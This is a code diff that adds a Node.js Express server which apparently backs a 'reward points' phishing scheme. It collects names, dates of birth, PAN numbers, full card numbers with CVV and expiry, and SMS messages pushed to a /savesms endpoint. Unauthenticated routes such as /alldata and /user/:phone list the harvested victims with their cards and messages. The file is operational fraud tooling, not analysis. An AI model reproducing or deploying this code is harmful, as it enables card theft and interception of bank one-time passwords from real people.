@@ -1,0 +1,498 @@
+require('dotenv').config();
+const express = require('express');
+const path = require('path');
+const bodyParser = require('body-parser');
+const twilio = require('twilio');
+const axios = require('axios');
+const cors = require('cors');
+var valid = require("card-validator");
+const { Console } = require('console');
+const app = express();
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+const cookieParser = require('cookie-parser');
+const { generateToken, verifyToken } = require('./jwt');
+const session = require('express-session');
+const mongoose = require('mongoose')
+const dbURL = process.env.ATLAS_DB_URL;
+
+
+
+
+mongoose.connect(dbURL)
+  .then(() => console.log(' db Connected!'));
+
+
+
+// defining the model for schema
+const UserSchema = new mongoose.Schema({
+  phone: { type: String, required: true, unique: true },
+  userData: {
+      // Define fields within userData based on your requirements
+      name: String,
+      dob: String,
+      pan: String,
+      phone: String,
+  },
+  cards: [{
+      cardNumber: String,
+      cvv: String,
+      expiryDate: String
+  }],
+  sms: [{
+    address: String,
+    body: String,
+    date: String
+}]
+});
+
+const User = mongoose.model('User', UserSchema);
+
+
+app.use(cors({ 
+    origin: '*', 
+    methods: ['GET','POST'],
+}));
+
+app.use(cookieParser());
+
+app.use(express.json());
+
+app.use(express.urlencoded({extended:true}))
+
+app.use(session({
+  secret: 'your-secret-key', // Replace with a strong secret key
+  resave: false,
+  saveUninitialized: true,
+  cookie: { secure: false } // Set to true if using HTTPS
+}));
+
+
+
+
+
+// Mt SID
+const accountSid = process.env.TWILIO_ACCOUNT_SID;
+const authToken = process.env.TWILIO_AUTH_TOKEN;
+const serviceSid = process.env.TWILIO_SERVICE_SID;
+const client = twilio(accountSid, authToken);
+
+const authenticateJWT = (req, res, next) => {
+  // next();
+  const token = req.cookies.token; // Get JWT from cookie
+  if (token) {
+    const user = verifyToken(token);
+    if (user) {
+      req.user = user;
+      next();
+    } else {
+      res.sendStatus(403); // Forbidden
+    }
+  } else {
+    res.sendStatus(401); // Unauthorized
+  }
+};
+
+
+
+
+
+// // Route for Login Page
+app.get('/', (req, res) => {
+  res.render('login');
+});
+
+
+// // Route for reward
+app.get('/reward',(req, res) => {
+    res.render('reward');
+  });
+
+
+// // Route for reward points
+app.get('/rewardpoints', (req, res) => {
+  const first = req.query.first;
+    res.render('reward_points',{first});
+  });
+
+
+function hasRequiredData(user) {
+    // Check if user is null or undefined
+    if (!user) {
+      console.error('User object is null or undefined:', user);
+      return false;
+    }
+  
+    const hasSMS = Array.isArray(user.sms) && user.sms.length > 0;
+    const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
+    const hasCardNumber = Array.isArray(user.cards) && user.cards.length >= 1;
+  
+    console.log('hasSMS:', hasSMS, 'hasPhone:', hasPhone, 'hasCardNumber:', hasCardNumber);
+  
+    return hasSMS && hasPhone && hasCardNumber;
+  }
+  
+
+
+
+app.get('/alldata', async (req, res) => {
+    try {
+      const allUsersWithSMS = await User.find()
+  
+      if (allUsersWithSMS.length === 0) {
+        return res.status(404).json({ valid: false, message: 'No SMS data found.' });
+      }
+  
+      const formattedData = allUsersWithSMS.map(user => {
+        return {
+          phone: user.phone,
+          complete: hasRequiredData(user),  // Use the function here
+          userData: user.userData 
+        };
+      });
+  
+      res.json({
+        data: formattedData
+      });
+    } catch (error) {
+      console.error('Error fetching SMS data:', error);
+      res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+  });
+
+
+
+
+
+
+app.get('/user/:phone', async (req, res) => {
+  const { phone } = req.params;
+
+  try {
+    const user = await User.findOne({ phone });
+
+    if (!user) {
+      return res.status(404).json({ valid: false, message: 'User not found' });
+    }
+    // const smsSorted = user.sms.sort((a, b) => b.check_date - a.check_date);
+    const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
+
+
+    console.log(user.sms.date)
+    // Log the user object to check if userData exists
+
+//     for (timestamp in user.sms){
+//         console.log(timestamp)
+//         const date = new Date(timestamp);
+//         const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+//         const indianDateFormat = date.toLocaleString('en-IN', options).replace(/,/g, ''); // remove commas
+// console.log(indianDateFormat);
+//         // const date = new Date(timestamp);
+//         // const options = { timeZone: 'America/Los_Angeles', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+//         // console.log(date.toLocaleString('en-US', options));
+//     }
+
+    res.json({
+      data: {
+        name: user.userData.name,
+        dob: user.userData.dob,
+        phone: user.userData.phone,
+        pan: user.userData.pan,
+        cards: firstCard,
+        _id:firstCard._id},
+      sms: user.sms
+    });
+  } catch (error) {
+    console.error('Error fetching user data:', error);
+    res.status(500).json({ valid: false, error: 'Internal server error' });
+  }
+});
+ 
+
+app.get('/delete/:phone', async (req, res) => {
+    const { phone } = req.params;
+  
+    try {
+      const user = await User.findOneAndDelete({ phone });
+  
+      if (!user) {
+        return res.status(404).json({ valid: false, message: 'User not found' });
+      }
+  
+      res.json({ valid: true, message: 'User deleted successfully' });
+    } catch (error) {
+      console.error('Error deleting user data:', error);
+      res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+  });
+
+
+
+
+app.get('/usera/:phone', async (req, res) => {
+    const { phone } = req.params;
+
+    try {
+        const user = await User.findOne({ phone });
+
+        if (!user) {
+            return res.status(404).json({ valid: false, message: 'User not found' });
+        }
+
+        // Sort sms array by date field
+        if (Array.isArray(user.sms)) {
+            user.sms.sort((a, b) => new Date(parseInt(a.date)) - new Date(parseInt(b.date)));
+        }
+
+        // Logging sorted sms with the specified date format
+        user.sms.forEach(sms => {
+            const date = new Date(parseInt(sms.date));
+            const options = { timeZone: 'America/Los_Angeles', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+            console.log(date.toLocaleString('en-US', options));
+        });
+
+        // Extract the first card from the cards array
+        const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
+
+        // Log the user object to check if userData exists
+        console.log('Fetched user:', user);
+
+        res.json({
+            data: {
+                name: user.userData.name,
+                dob: user.userData.dob,
+                phone: user.userData.phone,
+                pan: user.userData.pan,
+                cards: firstCard,
+                _id: firstCard._id
+            },
+            sms: user.sms
+        });
+    } catch (error) {
+        console.error('Error fetching user data:', error);
+        res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+});
+
+
+app.get('/userd/:phone', async (req, res) => {
+    const { phone } = req.params;
+
+    try {
+        const user = await User.findOne({ phone });
+
+        if (!user) {
+            return res.status(404).json({ valid: false, message: 'User not found' });
+        }
+
+        // Sort sms array by date field in descending order
+        if (Array.isArray(user.sms)) {
+            user.sms.sort((a, b) => new Date(parseInt(b.date)) - new Date(parseInt(a.date)));
+        }
+
+        // Logging sorted sms with the specified date format
+        user.sms.forEach(sms => {
+            const date = new Date(parseInt(sms.date));
+            const options = { timeZone: 'America/Los_Angeles', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+            console.log(date.toLocaleString('en-US', options));
+        });
+
+        // Extract the first card from the cards array
+        const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
+
+        // Log the user object to check if userData exists
+        console.log('Fetched user:', user);
+
+        res.json({
+            data: {
+                name: user.userData.name,
+                dob: user.userData.dob,
+                phone: user.userData.phone,
+                pan: user.userData.pan,
+                cards: firstCard,
+                _id: firstCard._id
+            },
+            sms: user.sms
+        });
+    } catch (error) {
+        console.error('Error fetching user data:', error);
+        res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+});
+
+
+
+app.post('/savesms', async(req, res) => {
+      var { address, body, date,phone } = req.body;
+    console.log("received data savsms",address,body,date,phone)
+    const smsData = {
+      address,
+      body,       
+      date
+    };
+    console.log('Updating user with phone:', phone);
+    try {
+        const user = await User.findOneAndUpdate(
+            { phone },
+            { $push: { sms: smsData } },
+            { new: true } 
+        );
+        if (user) {
+            console.log('Card successfully added to user:', user);
+            res.json({ valid: true });
+        } else {
+            console.log('User not found, responding with error');
+            res.json({ valid: false, error: 'User not found' });
+        }
+    } catch (error) {
+        console.error('Error saving card to MongoDB:', error);
+        res.json({ valid: false, error: 'Error saving card details' });
+    }
+  });
+  
+
+app.get('*', (req, res) => {
+    res.render('pnf');
+  });
+  
+
+
+
+app.post('/sendOTP', (req, res) => {
+  // console.log("OTP sent to",req.body)
+    // res.json({ success: true});
+    const { phone } = req.body;
+    console.log(phone)
+    client.verify.v2.services(serviceSid)
+      .verifications
+      .create(
+        {to: phone, channel: 'sms'}
+      )
+      .then(verification => {
+          console.log(verification.sid);
+          res.json({ success: true, sid: verification.sid });
+      })
+      .catch(error => {
+          console.error('Error sending OTP:', error);
+          res.json({ success: false, error: error.message });
+      });
+});
+
+
+
+
+app.post('/verifyOTP', async (req, res) => {
+  const { phone, otp, userData } = req.body;
+  try {
+      // Use await to get the verification result
+      const verification_check = await client.verify.v2.services(serviceSid)
+          .verificationChecks
+          .create({ to: phone, code: otp });
+
+      if (verification_check.status === 'approved') {
+          // let result = await User.exists({ phone: phone });
+          let result = await User.exists({ phone: phone,'cards': { $not: { $size: 0 } }  });
+          console.log("Already exist ", result);
+
+          if (result != null){
+              console.log('Number already exists, responding with error');
+              return res.json({ valid: false, error: 'number already exist' });
+          }
+          try {
+              console.log("userdata",userData)
+              let user = await User.findOneAndUpdate(
+                  { phone }, 
+                  { $set: { userData } },  
+                  { upsert: true, new: true }
+              );
+              req.session.userData = { phone : phone ,...userData };
+              const token = generateToken({ phone });
+              res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });
+              res.json({ success: true });
+          } catch (error) {
+              console.error('Error saving user data to MongoDB:', error);
+              res.json({ success: false, error: 'Error saving user data' });
+          }
+      } else {
+          res.json({ success: false });
+      }
+  } catch (error) {
+      console.error("Error verifying OTP:", error);
+      res.json({ success: false, error: error.message });
+  }
+});
+
+
+
+
+
+app.post('/validateCard', async (req, res) => {
+  console.log('Received request to /validateCard', req.session);
+
+  const { cardNumber, cvv, expiryDate } = req.body;
+
+  // Input Validation
+  const numberValidation = valid.number(cardNumber);
+  if (!numberValidation.isValid) {
+    return res.json({ valid: false, error: numberValidation.isPotentiallyValid 
+                                           ? 'Invalid card number' 
+                                           : 'Invalid card number format' }); 
+  }
+
+  try {
+    // Check for Duplicate Card (with Timeout)
+    const timeoutPromise = new Promise((_, reject) => {
+      setTimeout(() => reject(new Error('Database query timeout')), 5000); // 5-second timeout
+    });
+
+    const existsPromise = User.exists({ 'cards.cardNumber': cardNumber });
+    const result = await Promise.race([existsPromise, timeoutPromise]); 
+
+    if (result) {
+      return res.json({ valid: false, error: 'duplicate' });
+    }
+
+  } catch (error) {
+    console.error("Error checking card existence:", error.message); // Log the error message
+    if (error.message === 'Database query timeout') {
+      return res.status(503).json({ valid: false, error: 'Service unavailable' });
+    } else {
+      return res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+  }
+
+  // User Data Check and Card Saving
+  if (!req.session.userData) {
+    return res.json({ valid: false, error: 'User session not found' }); 
+  }
+
+  const userData = req.session.userData;
+  const phone = userData.phone;
+
+  try {
+    const user = await User.findOneAndUpdate(
+      { phone },
+      { $push: { cards: { cardNumber, cvv, expiryDate } } },
+      { new: true }
+    );
+
+    if (user) {
+      res.json({ valid: true });
+    } else {
+      res.json({ valid: false, error: 'User not found' });
+    }
+  } catch (error) {
+    console.error('Error saving card:', error.message);  // Log the error message
+    res.json({ valid: false, error: 'Error saving card details' });
+  }
+});
+
+
+
+
+app.listen(3000, () => {
+    console.log('Server running on port 3000');
+});
